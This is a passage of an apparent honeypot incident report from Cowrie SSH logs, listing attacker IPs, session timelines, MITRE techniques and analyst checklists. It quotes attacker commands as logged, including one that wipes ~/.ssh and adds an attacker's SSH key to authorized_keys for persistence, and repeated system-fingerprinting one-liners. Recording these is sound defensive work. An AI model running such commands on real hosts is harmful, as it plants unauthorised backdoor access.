| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:47:12` | `cowrie.session.connect` |
| `2026-08-30 13:47:12` | `cowrie.client.version` |
| `2026-08-30 13:47:12` | `cowrie.client.kex` |
| `2026-08-30 13:47:12` | `cowrie.login.success` |
| `2026-08-30 13:47:13` | `cowrie.session.params` |
| `2026-08-30 13:47:13` | `cowrie.command.input` |
| `2026-08-30 13:47:13` | `cowrie.log.closed` |
| `2026-08-30 13:47:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-373011efa7b4

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:47 |
| **Last Seen** | 2026-08-30 13:47 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:47:40` | `cowrie.session.connect` |
| `2026-08-30 13:47:40` | `cowrie.client.version` |
| `2026-08-30 13:47:40` | `cowrie.client.kex` |
| `2026-08-30 13:47:41` | `cowrie.login.success` |
| `2026-08-30 13:47:41` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:47:41` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:47:41` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:47:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bc39a42ca593

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:48 |
| **Last Seen** | 2026-08-30 13:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:48:19` | `cowrie.session.connect` |
| `2026-08-30 13:48:19` | `cowrie.client.version` |
| `2026-08-30 13:48:19` | `cowrie.client.kex` |
| `2026-08-30 13:48:21` | `cowrie.login.success` |
| `2026-08-30 13:48:22` | `cowrie.session.params` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.success` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:22` | `cowrie.command.input` |
| `2026-08-30 13:48:23` | `cowrie.log.closed` |
| `2026-08-30 13:48:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2304925badd4

| Field | Detail |
|---|---|
| **Source IP** | `186.158.183[.]66` |
| **First Seen** | 2026-08-30 13:48 |
| **Last Seen** | 2026-08-30 13:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:48:23` | `cowrie.session.connect` |
| `2026-08-30 13:48:23` | `cowrie.client.version` |
| `2026-08-30 13:48:23` | `cowrie.client.kex` |
| `2026-08-30 13:48:24` | `cowrie.login.success` |
| `2026-08-30 13:48:25` | `cowrie.session.params` |
| `2026-08-30 13:48:25` | `cowrie.command.input` |
| `2026-08-30 13:48:25` | `cowrie.command.failed` |
| `2026-08-30 13:48:26` | `cowrie.log.closed` |
| `2026-08-30 13:48:27` | `cowrie.session.params` |
| `2026-08-30 13:48:27` | `cowrie.command.input` |
| `2026-08-30 13:48:28` | `cowrie.session.file_download` |
| `2026-08-30 13:48:28` | `cowrie.log.closed` |
| `2026-08-30 13:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.183[.]66` to AbuseIPDB if not already reported
- [ ] Block `186.158.183[.]66` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b366fae1c185

| Field | Detail |
|---|---|
| **Source IP** | `186.158.183[.]66` |
| **First Seen** | 2026-08-30 13:48 |
| **Last Seen** | 2026-08-30 13:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:48:28` | `cowrie.session.connect` |
| `2026-08-30 13:48:28` | `cowrie.client.version` |
| `2026-08-30 13:48:28` | `cowrie.client.kex` |
| `2026-08-30 13:48:30` | `cowrie.login.success` |
| `2026-08-30 13:48:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.183[.]66` to AbuseIPDB if not already reported
- [ ] Block `186.158.183[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-610467850c6a

| Field | Detail |
|---|---|
| **Source IP** | `186.158.183[.]66` |
| **First Seen** | 2026-08-30 13:48 |
| **Last Seen** | 2026-08-30 13:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:48:30` | `cowrie.session.connect` |
| `2026-08-30 13:48:30` | `cowrie.client.version` |
| `2026-08-30 13:48:30` | `cowrie.client.kex` |
| `2026-08-30 13:48:32` | `cowrie.login.success` |
| `2026-08-30 13:48:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.158.183[.]66` to AbuseIPDB if not already reported
- [ ] Block `186.158.183[.]66` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2393f5000407

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:48 |
| **Last Seen** | 2026-08-30 13:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:48:50` | `cowrie.session.connect` |
| `2026-08-30 13:48:50` | `cowrie.client.version` |
| `2026-08-30 13:48:50` | `cowrie.client.kex` |
| `2026-08-30 13:48:51` | `cowrie.login.success` |
| `2026-08-30 13:48:51` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:48:51` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:48:51` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:48:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-da720f22142a

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:49 |
| **Last Seen** | 2026-08-30 13:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:49:37` | `cowrie.session.connect` |
| `2026-08-30 13:49:37` | `cowrie.client.version` |
| `2026-08-30 13:49:37` | `cowrie.client.kex` |
| `2026-08-30 13:49:37` | `cowrie.login.success` |
| `2026-08-30 13:49:38` | `cowrie.session.params` |
| `2026-08-30 13:49:38` | `cowrie.command.input` |
| `2026-08-30 13:49:38` | `cowrie.log.closed` |
| `2026-08-30 13:49:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e892e5be39f9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:50 |
| **Last Seen** | 2026-08-30 13:50 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:50:01` | `cowrie.session.connect` |
| `2026-08-30 13:50:02` | `cowrie.client.version` |
| `2026-08-30 13:50:02` | `cowrie.client.kex` |
| `2026-08-30 13:50:03` | `cowrie.login.success` |
| `2026-08-30 13:50:04` | `cowrie.session.params` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.success` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:04` | `cowrie.command.input` |
| `2026-08-30 13:50:05` | `cowrie.log.closed` |
| `2026-08-30 13:50:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-af447fbc6f0d

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:51 |
| **Last Seen** | 2026-08-30 13:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:51:45` | `cowrie.session.connect` |
| `2026-08-30 13:51:45` | `cowrie.client.version` |
| `2026-08-30 13:51:45` | `cowrie.client.kex` |
| `2026-08-30 13:51:47` | `cowrie.login.success` |
| `2026-08-30 13:51:48` | `cowrie.session.params` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.success` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.command.input` |
| `2026-08-30 13:51:48` | `cowrie.log.closed` |
| `2026-08-30 13:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1363fb98b0a3

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:52 |
| **Last Seen** | 2026-08-30 13:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:52:04` | `cowrie.session.connect` |
| `2026-08-30 13:52:04` | `cowrie.client.version` |
| `2026-08-30 13:52:04` | `cowrie.client.kex` |
| `2026-08-30 13:52:04` | `cowrie.login.success` |
| `2026-08-30 13:52:05` | `cowrie.session.params` |
| `2026-08-30 13:52:05` | `cowrie.command.input` |
| `2026-08-30 13:52:05` | `cowrie.log.closed` |
| `2026-08-30 13:52:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-297ada857ba9

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:53 |
| **Last Seen** | 2026-08-30 13:53 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:53:26` | `cowrie.session.connect` |
| `2026-08-30 13:53:26` | `cowrie.client.version` |
| `2026-08-30 13:53:26` | `cowrie.client.kex` |
| `2026-08-30 13:53:28` | `cowrie.login.success` |
| `2026-08-30 13:53:29` | `cowrie.session.params` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.success` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.command.input` |
| `2026-08-30 13:53:29` | `cowrie.log.closed` |
| `2026-08-30 13:53:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a9a6374de14

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:54 |
| **Last Seen** | 2026-08-30 13:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:54:28` | `cowrie.session.connect` |
| `2026-08-30 13:54:28` | `cowrie.client.version` |
| `2026-08-30 13:54:28` | `cowrie.client.kex` |
| `2026-08-30 13:54:29` | `cowrie.login.success` |
| `2026-08-30 13:54:30` | `cowrie.session.params` |
| `2026-08-30 13:54:30` | `cowrie.command.input` |
| `2026-08-30 13:54:30` | `cowrie.log.closed` |
| `2026-08-30 13:54:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e611f511c2fa

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:55 |
| **Last Seen** | 2026-08-30 13:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:55:11` | `cowrie.session.connect` |
| `2026-08-30 13:55:11` | `cowrie.client.version` |
| `2026-08-30 13:55:11` | `cowrie.client.kex` |
| `2026-08-30 13:55:12` | `cowrie.login.success` |
| `2026-08-30 13:55:13` | `cowrie.session.params` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.success` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.command.input` |
| `2026-08-30 13:55:13` | `cowrie.log.closed` |
| `2026-08-30 13:55:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96e2b624b64c

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-08-30 13:57 |
| **Last Seen** | 2026-08-30 13:57 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:57:00` | `cowrie.session.connect` |
| `2026-08-30 13:57:00` | `cowrie.client.version` |
| `2026-08-30 13:57:00` | `cowrie.client.kex` |
| `2026-08-30 13:57:01` | `cowrie.login.success` |
| `2026-08-30 13:57:03` | `cowrie.session.params` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.success` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.command.input` |
| `2026-08-30 13:57:03` | `cowrie.log.closed` |
| `2026-08-30 13:57:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0ea3b093780c

| Field | Detail |
|---|---|
| **Source IP** | `2.57.122[.]53` |
| **First Seen** | 2026-08-30 13:57 |
| **Last Seen** | 2026-08-30 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:57:01` | `cowrie.session.connect` |
| `2026-08-30 13:57:01` | `cowrie.client.version` |
| `2026-08-30 13:57:01` | `cowrie.client.kex` |
| `2026-08-30 13:57:01` | `cowrie.login.success` |
| `2026-08-30 13:57:02` | `cowrie.session.params` |
| `2026-08-30 13:57:02` | `cowrie.command.input` |
| `2026-08-30 13:57:02` | `cowrie.log.closed` |
| `2026-08-30 13:57:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.57.122[.]53` to AbuseIPDB if not already reported
- [ ] Block `2.57.122[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63edc26be5b6

| Field | Detail |
|---|---|
| **Source IP** | `217.60.255[.]130` |
| **First Seen** | 2026-08-30 13:57 |
| **Last Seen** | 2026-08-30 13:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:57:15` | `cowrie.session.connect` |
| `2026-08-30 13:57:15` | `cowrie.client.version` |
| `2026-08-30 13:57:15` | `cowrie.client.kex` |
| `2026-08-30 13:57:16` | `cowrie.login.success` |
| `2026-08-30 13:57:16` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:57:16` | `cowrie.direct-tcpip.ja4h` |
| `2026-08-30 13:57:16` | `cowrie.direct-tcpip.data` |
| `2026-08-30 13:57:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.60.255[.]130` to AbuseIPDB if not already reported
- [ ] Block `217.60.255[.]130` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-667f247db4a3

| Field | Detail |
|---|---|
| **Source IP** | `58.57.154[.]146` |
| **First Seen** | 2026-08-30 13:57 |
| **Last Seen** | 2026-08-30 13:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-30 13:57:45` | `cowrie.session.connect` |
| `2026-08-30 13:57:45` | `cowrie.client.version` |
| `2026-08-30 13:57:45` | `cowrie.client.kex` |
| `2026-08-30 13:57:47` | `cowrie.login.success` |
| `2026-08-30 13:57:49` | `cowrie.direct-tcpip.request` |
| `2026-08-30 13:57:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.57.154[.]146` to AbuseIPDB if not already reported
- [ ] Block `58.57.154[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2671c7bfcf7e

| Field | Detail |
|---|---|
| **Source IP** | `212.174.62[.]233` |
| **First Seen** | 2026-08-30 13:57 |
